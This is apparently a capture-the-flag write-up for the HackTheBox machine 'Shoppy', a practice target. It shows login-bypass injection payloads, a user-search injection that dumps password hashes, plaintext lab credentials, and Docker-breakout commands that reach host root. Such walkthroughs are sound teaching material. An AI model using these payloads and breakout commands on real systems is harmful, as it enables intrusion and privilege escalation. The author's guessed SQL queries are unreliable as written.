# Shoppy

![Nmap Enumeration](../../images/42278d16449490169460e9f9fe12e90df38b02acf13b6001889a2a5dcab36e6d.png)  
![Subdomain enumeration](../../images/67ec2b6b4f2c0dc2948d69cbc9972518c148abfd672873d1ab65b82e0eec5341.png)  
![Dirbusting](../../images/a73a7d424723412fb6b05f8a7a1182c09c60c67ba1d0038ed4a529ec04192ba6.png)  

![mattermost page view](../../images/7e28082330660bdc00629faddd80edc4a77a292a3fda1cf36ac7b3e9ded8b7f6.png)  
![Login CTF](../../images/d35c4f3bf5e8de6ba77cd5622a2689cccbd40a7577d1cbfee15e26f5baaccaf9.png)  

Fuzzing for the post paramaters ==> It errors for SQLI.
Trying to guess the sql query:

```SQL
select username where username='USERNAME_INPUT' and password='PASSWORD_INPUT';
select username where username="USERNAME_INPUT" and password='PASSWORD_INPUT';
```

To login we should
```SQL
select username where username='admin' or '1'='1' and password='PASSWORD_INPUT';
select username where username='admin' || '1'='1' and password='PASSWORD_INPUT';
select username where username='admin' || '1=1' and password='PASSWORD_INPUT';
select username where username='admin' || '1=1' and password='PASSWORD_INPUT';
```

![Got access finally](../../images/a608231baac632570480c3da9d6b09357963a59aabf4cc1977f60da4e3836e4f.png)  

![Search users](../../images/384d83e0e3ccaf5bf6ea5640b5808fbcce82540f4591aa624853b71e4b9f585a.png)  

`http://shoppy.htb/admin/search-users?username=admin`
Tried SQLI on username query param with sqlmap and quick fuzzing showed me that it's also vulnerable probably the same developer :,)

```json
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

![Password looks hashed](../../images/a2e3d0e32551bc021e7de1aa63324e2b25cf6f4404fe71f27a7198d08cba9409.png)  
![Cracking user password](../../images/31602428cf3b8f5b378a431ff182055856835d8d9a0cf4553a74be59ee10c616.png)  
Trying the credentials on the subdomain page: 
![Logged in view](../../images/ea2ca9e24e1f2be8714b344d5570c9ff437852569afc58810c5e88fc97bf21d1.png)  

![Docker creds](../../images/ed562fce6267aec20829c0cf03d694a318aa3756e05f5ac8f54ea29bd87a0e93.png)  

```creds
username: jaeger
password: Sh0ppyBest@pp!
```

Going back to ssh
![SSH in](../../images/b79efe0e83160dee7ab1e4bd5d5bb26bd9b266cd9f725cc88957c341726f0825.png)  

![Sudo -l](../../images/b3aa6cbbea34e0f34139d177aa7bbae9d5ff21404fc6fd0f00df201efe6d56ce.png)  

Finding the file `password-manager`, getting it to my machine and opening with ghidra. The password was `Sample`
![Decompiling](../../images/55076bf0668ed87d9e1c6d88f50a51d1c72e2c1501c1aaa3ac007b7b65afab09.png)  

Now we have a new pair of credentials:
![deploy Credentials](../../images/98256a61e50b3505aaae1995a1aedd2a42f2b3450bba3273128907f533ad74aa.png)  

```creds
username: deploy                                                                                                     │
password: Deploying@pp! 
```

Now we want to break out of the container: That's basically easy as the container still communicates with the daemon through a socket
![picture 16](../../images/3aa65dcb82e2f7fd60131463683cbd2e7e16c26b9f2c484810265f3cc5028e46.png)  

1. `docker images` => We find an alpine image available
2. `docker run -it --rm --pid=host --privileged alpine sh`
3. `docker run -it -v /:/host/ alpine chroot /host/ bash`
4. `nsenter --target 1 --mount --uts --ipc --net --pid -- bash` => Tadaa get the flag now

[Reference](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)